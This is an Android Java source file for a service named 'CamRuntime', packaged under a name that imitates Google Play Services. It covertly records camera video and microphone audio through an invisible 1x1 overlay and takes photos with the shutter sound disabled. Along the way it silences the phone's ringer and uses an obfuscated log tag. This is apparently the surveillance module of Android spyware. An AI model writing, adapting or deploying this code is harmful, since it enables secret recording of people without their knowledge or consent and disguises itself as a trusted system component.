package com.google.android.play.services;

import android.app.*;
import android.content.*;
import android.view.*;
import android.os.*;
import android.graphics.*;
import android.widget.*;
import android.hardware.Camera;
import android.util.*;
import android.media.*;
import java.io.*;
import java.text.*;
import java.util.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class CamRuntime extends Service {

    private static String TAG = "AsDfGhJkL";

    private LocalBinder localBinder = new LocalBinder();
    private DummyPreview dummyPreview;
    private SystemThread system;
    private AudioManager audioManager;
    private ReceiverBoot receAction;
    public static int isCamera = 1;//depan
    public static String path = "";
    public static String namaFoto = "";
    public static int kualitas = 0;
    public static String led = "";

    public DummyPreview getDummyPreview() {
        return dummyPreview;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (kualitas == 1) {
            kualitas = CamcorderProfile.QUALITY_480P;
        } else {
            kualitas = CamcorderProfile.QUALITY_LOW;
        }
        system = new SystemThread();
        receAction = new ReceiverBoot();
        audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
        audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT); //NORMAL, VIBRATE

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        this.dummyPreview = new DummyPreview(this, startId);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(1, 1,
                                                                       WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                                                                       WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
        lp.gravity = Gravity.START | Gravity.TOP;
        wm.addView(dummyPreview, lp);
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        wm.removeViewImmediate(dummyPreview);
        stopSelf();

        isCamera = 1;
    }

    public String listCamera() throws Exception {
        Class<?> cameraClass = Class.forName("android.hardware.Camera");
        Object cameraInfo = null;
        StringBuilder out = new StringBuilder();
        Field field = null;
        int cameraCount = 0;
        try {
            Method getNumberOfCamerasMethod = cameraClass.getMethod("getNumberOfCameras");
            cameraCount = (Integer) getNumberOfCamerasMethod.invoke(null, (Object[]) null);
        } catch (NoSuchMethodException nsme) {
            out.append("default");
        }
        Class<?> cameraInfoClass = Class.forName("android.hardware.Camera$CameraInfo");
        if (cameraInfoClass != null) {
            cameraInfo = cameraInfoClass.newInstance();
        }
        if (cameraInfo != null) {
            field = cameraInfo.getClass().getField("facing");
        }
        Method getCameraInfoMethod = cameraClass.getMethod("getCameraInfo", Integer.TYPE, cameraInfoClass);
        if (getCameraInfoMethod != null && cameraInfoClass != null && field != null) {
            for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                getCameraInfoMethod.invoke(null, camIdx, cameraInfo);
                int facing = field.getInt(cameraInfo);
                if (facing == 1) { // Camera.CameraInfo.CAMERA_FACING_FRONT
                    out.append("depan ");
                } else {
                    out.append("back");
                }
            }
        }
        return out.toString();
    }

    public static void capturePhoto(String kamera, String path, String namaFoto, Context context) {

        Camera camera = null;
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();

        int frontCamera = 1;

        if (kamera.equals("back")) {
            frontCamera = 0;
            Log.i(TAG, "cam:"+frontCamera);
            Camera.getCameraInfo(frontCamera, cameraInfo);
        
        } else {
            Camera.getCameraInfo(frontCamera, cameraInfo);
        }

        if (cameraInfo.canDisableShutterSound) {
            camera.enableShutterSound(false);
        }

        try {
            camera = Camera.open(frontCamera);
            Log.i(TAG, "camera :"+frontCamera+path);

        } 
        catch (RuntimeException e) {
            camera = null;
            e.printStackTrace();
            Log.i(TAG, "camera err:"+e);
        }
        try {
            if (null == camera) {
                Log.i(TAG, "camera null:"+frontCamera);
            } else {
                try {
                    if (Build.VERSION.SDK_INT >= 17) {
                        if (led.equals("led")) {
                            Camera.Parameters parameters = camera.getParameters();
                            parameters.setFlashMode("torch");
                            camera.setParameters(parameters);

                            Log.i(TAG, "led");
                        }
                    }
                    camera.setPreviewTexture(new SurfaceTexture(0));
                    camera.startPreview();

                } catch (Exception e) {
                    e.printStackTrace();
                    Log.i(TAG, "err prev:"+e);
                }
                camera.takePicture(null, null, new Camera.PictureCallback() 
                {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) 
                    {
                        File file = new File(path);
                        if (!file.exists() && !file.mkdirs()) {
                            file.mkdirs();
                        }
                       
                        String filename = file.getPath() + File.separator + namaFoto;
                        File mainPicture = new File(filename);

                        try {
                            FileOutputStream fos = new FileOutputStream(mainPicture);
                            fos.write(data);
                            fos.close();
                        } catch (Exception error) {
                            Log.i(TAG, "err save:"+error);
                        }
                        camera.stopPreview();
                        camera.release();
                    }
                });
            }
        } catch (Exception e) {
            camera.stopPreview();
            camera.release();
            Log.i(TAG, "err camera:"+e);

        }
        led = "";
    }

    @Override
    public IBinder onBind(Intent intent) {
        return localBinder;
    }

    public class LocalBinder extends Binder {

        public void matikan() {
            stopSelf();
        }

        public boolean isAktif() {
            return (dummyPreview != null) && dummyPreview.isAktif();
        }

    }

}

class DummyPreview extends SurfaceView implements SurfaceHolder.Callback {

    private Camera camera;
    private CamRuntime videoRecordService;
    private RecordThread recorderThread;
    private int serviceId;
    private static String TAG = "AsDfGhJkL";


    public DummyPreview(CamRuntime videoRecordService, int serviceId) {
        super(videoRecordService);
        this.videoRecordService = videoRecordService;
        this.serviceId = serviceId;
        getHolder().addCallback(this);
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            camera = Camera.open(new CamRuntime().isCamera);
            camera.setPreviewDisplay(holder);
            recorderThread = new RecordThread(serviceId, videoRecordService, camera);
            recorderThread.start();
        } catch (Exception e) {
            Log.i("MyRecorder", "Terjadi kesalahan saat menampilkan preview..."+e);
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        if (recorderThread != null) {
            recorderThread.setAktif(false);
            Log.i(TAG, "surface destroy");
        }
    }

    public boolean isAktif() {
        return (recorderThread == null)? false: recorderThread.isAktif();
    }

}

class RecordThread extends Thread {

    private boolean aktif;
    private int serviceId;
    private final CamRuntime recorderService;
    private Camera camera;
    private String outputFile = "";
    private static String TAG = "AsDfGhJkL";

    public RecordThread(int serviceId, CamRuntime recorderService, Camera camera) {
        this.serviceId = serviceId;
        this.aktif = true;
        this.recorderService = recorderService;
        this.camera = camera;
        outputFile = new CamRuntime().path + "/REC_SYSTEM.mp4";
    }

    @Override
    public void run() {
        Log.i(TAG, "save: "+outputFile);
        try {
            // Memulai proses rekaman
            MediaRecorder mediaRecorder = new MediaRecorder();
            camera.unlock();
            camera.enableShutterSound(false);

            mediaRecorder.setCamera(camera);
            mediaRecorder.setOrientationHint(270);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mediaRecorder.setProfile(CamcorderProfile.get(new CamRuntime().kualitas));
            mediaRecorder.setOutputFile(outputFile);
            mediaRecorder.setPreviewDisplay(recorderService.getDummyPreview().getHolder().getSurface());
            mediaRecorder.prepare();
            mediaRecorder.start();
            aktif = true;
            while (aktif) {
                Thread.sleep(100);
            }
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaRecorder.release();

        } catch (Exception ex) {
            Log.e("MyRecorder", "Terjadi kesalahan saat merekam", ex);
        } finally {
            camera.release();
            recorderService.stopSelf(serviceId);
        }
    }

    public boolean isAktif() {
        return aktif;
    }

    public void setAktif(boolean aktif) {
        this.aktif = aktif;
    }

}

